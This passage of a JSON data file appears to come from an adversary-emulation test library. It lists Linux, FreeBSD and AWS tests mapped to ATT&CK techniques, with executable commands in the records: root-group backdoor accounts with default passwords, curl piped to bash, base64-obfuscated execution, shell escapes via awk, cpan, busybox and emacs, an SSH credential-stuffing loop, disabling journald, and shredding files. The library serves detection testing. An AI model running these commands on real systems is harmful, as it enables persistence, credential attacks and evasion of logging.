    "test_guid": "a1040a30-d28b-4eda-bd99-bb2861a4616c",
    "description": "Creates a new user (username: butter, password: BetterWithButter) in Linux and adds the user to the `root` group.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n",
      "cleanup_command": "userdel #{username}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "username": {
        "description": "Username of the user to create",
        "type": "string",
        "default": "butter"
      },
      "password": {
        "description": "Password of the user to create",
        "type": "string",
        "default": "BetterWithButter"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
    "indexed_technique": "T1136.001.03",
    "technique_index": 3,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1136.001",
    "display_name": "Create Account: Local Account",
    "source_file": "T1136.001.yaml",
    "test_name": "Create a new user in FreeBSD with `root` GID.",
    "test_guid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a",
    "description": "Creates a new user (username: butter, password: BetterWithButter) in FreeBSD and adds the user to the `root` group.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n",
      "cleanup_command": "pw userdel #{username}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "username": {
        "description": "Username of the user to create",
        "type": "string",
        "default": "butter"
      },
      "password": {
        "description": "Password of the user to create",
        "type": "string",
        "default": "BetterWithButter"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
    "indexed_technique": "T1136.001.04",
    "technique_index": 4,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1552",
    "display_name": "Unsecured Credentials",
    "source_file": "T1552.yaml",
    "test_name": "AWS - Retrieve EC2 Password Data using stratus",
    "test_guid": "a21118de-b11e-4ebd-b655-42f11142df0c",
    "description": "This test uses Stratus Red Team in $PathToAtomicsFolder/T1552/src to simulate an unauthorized ec2:GetPasswordData API call in us-west-2 to retrieve RDP passwords for Windows EC2 instances.",
    "supported_platforms": [
      "linux",
      "macos",
      "iaas:aws"
    ],
    "executor": {
      "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data --force\n",
      "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "stratus_path": {
        "description": "Path of stratus binary",
        "type": "path",
        "default": "$PathToAtomicsFolder/T1552/src"
      },
      "aws_region": {
        "description": "AWS region to detonate",
        "type": "string",
        "default": "us-west-2"
      }
    },
    "dependencies": [
      {
        "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
        "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
      },
      {
        "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
        "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
        "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n",
    "indexed_technique": "T1552.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Create and Execute Bash Shell Script",
    "test_guid": "7e7ac3ed-f795-4fa5-b711-09d6fbe9b873",
    "description": "Creates a shell script at /tmp/art.sh containing a ping command to 8.8.8.8, makes it executable, and then runs it.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\"\nsh -c \"echo 'ping -c 4 #{host}' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n",
      "cleanup_command": "rm #{script_path}\n",
      "name": "sh"
    },
    "input_arguments": {
      "script_path": {
        "description": "Script path",
        "type": "path",
        "default": "/tmp/art.sh"
      },
      "host": {
        "description": "Host to ping",
        "type": "string",
        "default": "8.8.8.8"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates and executes a simple sh script.\n",
    "indexed_technique": "T1059.004.01",
    "technique_index": 1,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Command-Line Interface",
    "test_guid": "d0c88567-803d-4dca-99b4-7ce65e7b257c",
    "description": "Using Curl to download and pipe a payload (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh) to Bash. Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n",
      "cleanup_command": "rm /tmp/art-fish.txt\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
    "indexed_technique": "T1059.004.02",
    "technique_index": 2,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Harvest SUID executable files",
    "test_guid": "46274fc6-08a7-4956-861b-24cbbaa0503c",
    "description": "This test runs the AutoSUID script from PathToAtomicsFolder/T1059.004/src/AutoSUID.sh to harvest SUID executable files.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "chmod +x #{autosuid}\nbash #{autosuid}\n",
      "cleanup_command": "rm -rf #{autosuid}\n",
      "name": "sh"
    },
    "input_arguments": {
      "autosuid": {
        "description": "Path to the autosuid shell script",
        "type": "path",
        "default": "PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"
      },
      "autosuid_url": {
        "description": "Path to download autosuid shell script",
        "type": "url",
        "default": "https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh"
      }
    },
    "dependencies": [
      {
        "description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
        "prereq_command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "curl --create-dirs #{autosuid_url} --output #{autosuid}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n",
    "indexed_technique": "T1059.004.03",
    "technique_index": 3,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "LinEnum tool execution",
    "test_guid": "a2b35a63-9df1-4806-9a4d-5fe0500845f2",
    "description": "Downloads the LinEnum script from https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh and runs it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "chmod +x #{linenum}\nbash #{linenum}\n",
      "cleanup_command": "rm -rf #{linenum}\n",
      "name": "sh"
    },
    "input_arguments": {
      "linenum": {
        "description": "Path to the LinEnum shell script",
        "type": "path",
        "default": "PathToAtomicsFolder/T1059.004/src/LinEnum.sh"
      },
      "linenum_url": {
        "description": "Path to download LinEnum shell script",
        "type": "url",
        "default": "https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh"
      }
    },
    "dependencies": [
      {
        "description": "LinnEnum must exist on disk at specified location (#{linenum})\n",
        "prereq_command": "if [ -f #{linenum} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "curl --create-dirs #{linenum_url} --output #{linenum}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n",
    "indexed_technique": "T1059.004.04",
    "technique_index": 4,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "New script file in the tmp directory",
    "test_guid": "8cd1947b-4a54-41fb-b5ea-07d0ace04f81",
    "description": "Creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n",
      "cleanup_command": "rm $TMPFILE\nunset TMPFILE\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
    "indexed_technique": "T1059.004.05",
    "technique_index": 5,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "What shell is running",
    "test_guid": "7b38e5cc-47be-44f0-a425-390305c76c17",
    "description": "Runs commands to discover what shell is running.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n",
    "indexed_technique": "T1059.004.06",
    "technique_index": 6,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "What shells are available",
    "test_guid": "bf23c7dc-1004-4949-8262-4c1d1ef87702",
    "description": "Runs commands to discover what shells are available on the host.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "cat /etc/shells \n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n",
    "indexed_technique": "T1059.004.07",
    "technique_index": 7,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Command line scripts",
    "test_guid": "b04ed73c-7d43-4dc8-b563-a2fc595cba1a",
    "description": "Executes a `for` loop that iterates five times, printing a message and the loop number, and sleeping for one second in each iteration.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n",
    "indexed_technique": "T1059.004.08",
    "technique_index": 8,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Obfuscated command line scripts",
    "test_guid": "5bec4cc8-f41e-437b-b417-33ff60acf9af",
    "description": "The commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n",
    "indexed_technique": "T1059.004.09",
    "technique_index": 9,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Change login shell",
    "test_guid": "c7ac59cb-13cc-4622-81dc-6d2fee9bfac7",
    "description": "The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n",
      "cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y art || userdel art\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "chsh - change login shell, must be installed\n",
        "prereq_command": "if [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n",
        "get_prereq_command": "echo \"Automated installer not implemented yet, please install chsh manually\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n",
    "indexed_technique": "T1059.004.10",
    "technique_index": 10,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Environment variable scripts",
    "test_guid": "bdaebd56-368b-4970-a523-f905ff4a8a51",
    "description": "The test places scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n",
      "cleanup_command": "unset ART\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
    "indexed_technique": "T1059.004.11",
    "technique_index": 11,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Detecting pipe-to-shell",
    "test_guid": "fca246a8-a585-4f28-a2df-6495973976a1",
    "description": "This test uses curl to download the pipe-to-shell.sh script (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh), the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n",
      "cleanup_command": "rm /tmp/art.txt\n"
    },
    "input_arguments": {
      "remote_url": {
        "description": "url of remote payload",
        "type": "url",
        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
      }
    },
    "dependencies": [
      {
        "description": "Check if curl is installed on the machine.\n",
        "prereq_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
        "get_prereq_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
    "indexed_technique": "T1059.004.12",
    "technique_index": 12,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Current kernel information enumeration",
    "test_guid": "3a53734a-9e26-4f4b-ad15-059e767f5f14",
    "description": "The command will enumerate the kernel information.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "uname -srm\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n",
    "indexed_technique": "T1059.004.13",
    "technique_index": 13,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Shell Creation using awk command",
    "test_guid": "ee72b37d-b8f5-46a5-a9e7-0ff50035ffd5",
    "description": "This test uses awk's BEGIN rule to execute /bin/sh, creating a shell.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "awk 'BEGIN {system(\"/bin/sh &\")}'",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "In awk the begin rule runs the first record without reading or interpreting it. This way a shell can be created and used to break out from restricted environments with the awk command.\nReference - https://gtfobins.github.io/gtfobins/awk/#shell",
    "indexed_technique": "T1059.004.14",
    "technique_index": 14,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Creating shell using cpan command",
    "test_guid": "bcd4c2bc-490b-4f91-bd31-3709fe75bbdf",
    "description": "This test uses cpan with a perl command to execute /bin/sh, creating a shell.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "echo '! exec \"/bin/sh &\"' | PERL_MM_USE_DEFAULT=1  cpan",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.\nReference - https://gtfobins.github.io/gtfobins/cpan/",
    "indexed_technique": "T1059.004.15",
    "technique_index": 15,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "Shell Creation using busybox command",
    "test_guid": "ab4d04af-68dc-4fee-9c16-6545265b3276",
    "description": "Uses busybox to create a shell.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "busybox sh &",
      "cleanup_command": null,
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "BusyBox is a multi-call binary. A multi-call binary is an executable program that performs the same job as more than one utility program. It can be used to break out from restricted environments by spawning an interactive system shell. \nReference - https://gtfobins.github.io/gtfobins/busybox/",
    "indexed_technique": "T1059.004.16",
    "technique_index": 16,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1059.004",
    "display_name": "Command and Scripting Interpreter: Bash",
    "source_file": "T1059.004.yaml",
    "test_name": "emacs spawning an interactive system shell",
    "test_guid": "e0742e38-6efe-4dd4-ba5c-2078095b6156",
    "description": "This test uses emacs to spawn an interactive /bin/sh shell.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if emacs is installed on the machine.\n",
        "prereq_command": "if [ -x \"$(command -v emacs)\" ]; then echo \"emacs is installed\"; else echo \"emacs is NOT installed\"; exit 1; fi\n",
        "get_prereq_command": "which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs || which brew && brew update && brew install --quiet emacs\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "emacs can be used to break out from restricted environments by spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/  \n",
    "indexed_technique": "T1059.004.17",
    "technique_index": 17,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1070.004",
    "display_name": "Indicator Removal on Host: File Deletion",
    "source_file": "T1070.004.yaml",
    "test_name": "Delete a single file - FreeBSD/Linux/macOS",
    "test_guid": "562d737f-2fc6-4b09-8c2a-7f8ff0828480",
    "description": "Delete a single file (/tmp/victim-files/T1070.004-test.txt) from the temporary directory (/tmp/victim-files/).",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "rm -f #{file_to_delete}\n",
      "cleanup_command": "rm -rf #{parent_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "parent_folder": {
        "description": "Path of parent folder",
        "type": "path",
        "default": "/tmp/victim-files/"
      },
      "file_to_delete": {
        "description": "Path of file to delete",
        "type": "path",
        "default": "/tmp/victim-files/T1070.004-test.txt"
      }
    },
    "dependencies": [
      {
        "description": "The file must exist in order to be deleted\n",
        "prereq_command": "test -e #{file_to_delete} && exit 0 || exit 1\n",
        "get_prereq_command": "mkdir -p #{parent_folder} && touch #{file_to_delete}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Delete a single file from the temporary directory\n",
    "indexed_technique": "T1070.004.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.004",
    "display_name": "Indicator Removal on Host: File Deletion",
    "source_file": "T1070.004.yaml",
    "test_name": "Delete an entire folder - FreeBSD/Linux/macOS",
    "test_guid": "a415f17e-ce8d-4ce2-a8b4-83b674e7017e",
    "description": "Recursively delete the temporary directory and all files contained within it (/tmp/folder).",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "rm -rf #{folder_to_delete}\n",
      "name": "sh"
    },
    "input_arguments": {
      "folder_to_delete": {
        "description": "Path of folder to delete",
        "type": "path",
        "default": "/tmp/victim-folder"
      }
    },
    "dependencies": [
      {
        "description": "The folder must exist in order to be deleted\n",
        "prereq_command": "test -e #{folder_to_delete} && exit 0 || exit 1\n",
        "get_prereq_command": "mkdir -p #{folder_to_delete}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Recursively delete the temporary directory and all files contained within it\n",
    "indexed_technique": "T1070.004.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.004",
    "display_name": "Indicator Removal on Host: File Deletion",
    "source_file": "T1070.004.yaml",
    "test_name": "Overwrite and delete a file with shred",
    "test_guid": "039b4b10-2900-404b-b67f-4b6d49aa6499",
    "description": "Use the `shred` command to overwrite the temporary file (/tmp/shred.txt) and then delete it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "shred -u #{file_to_shred}\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_to_shred": {
        "description": "Path of file to shred",
        "type": "path",
        "default": "/tmp/victim-shred.txt"
      }
    },
    "dependencies": [
      {
        "description": "Check if file already exists\n",
        "prereq_command": "if [ -f \"#{file_to_shred}\" ]; then echo \"File already exists\"; else echo \"File does NOT exist yet\"; exit 1; fi\n",
        "get_prereq_command": "touch #{file_to_shred}\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Use the `shred` command to overwrite the temporary file and then delete it\n",
    "indexed_technique": "T1070.004.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1110.004",
    "display_name": "Brute Force: Credential Stuffing",
    "source_file": "T1110.004.yaml",
    "test_name": "SSH Credential Stuffing From Linux",
    "test_guid": "4f08197a-2a8a-472d-9589-cd2895ef22ad",
    "description": "Using username,password combination from a password dump to login to localhost over SSH.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"
    },
    "input_arguments": {
      "target_host": {
        "description": "IP Address / Hostname you want to target.",
        "type": "string",
        "default": "localhost"
      }
    },
    "dependencies": [
      {
        "description": "Requires SSHPASS\n",
        "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Using username,password combination from a password dump to login over SSH.\n",
    "indexed_technique": "T1110.004.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1110.004",
    "display_name": "Brute Force: Credential Stuffing",
    "source_file": "T1110.004.yaml",
    "test_name": "SSH Credential Stuffing From FreeBSD",
    "test_guid": "a790d50e-7ebf-48de-8daa-d9367e0911d4",
    "description": "Using username,password combination from a password dump to login to localhost over SSH.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"
    },
    "input_arguments": {
      "target_host": {
        "description": "IP Address / Hostname you want to target.",
        "type": "string",
        "default": "localhost"
      }
    },
    "dependencies": [
      {
        "description": "Requires SSHPASS\n",
        "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "pkg install -y sshpass\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Using username,password combination from a password dump to login over SSH.\n",
    "indexed_technique": "T1110.004.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1562",
    "display_name": "Impair Defenses",
    "source_file": "T1562.yaml",
    "test_name": "Disable journal logging via systemctl utility",
    "test_guid": "c3a377f9-1203-4454-aa35-9d391d34768f",
    "description": "The atomic test disables the journal logging using built-in systemctl utility\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo systemctl stop systemd-journald #disables journal logging\n",
      "cleanup_command": "sudo systemctl start systemd-journald #starts journal service\nsudo systemctl enable systemd-journald #starts journal service automatically at boot time\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
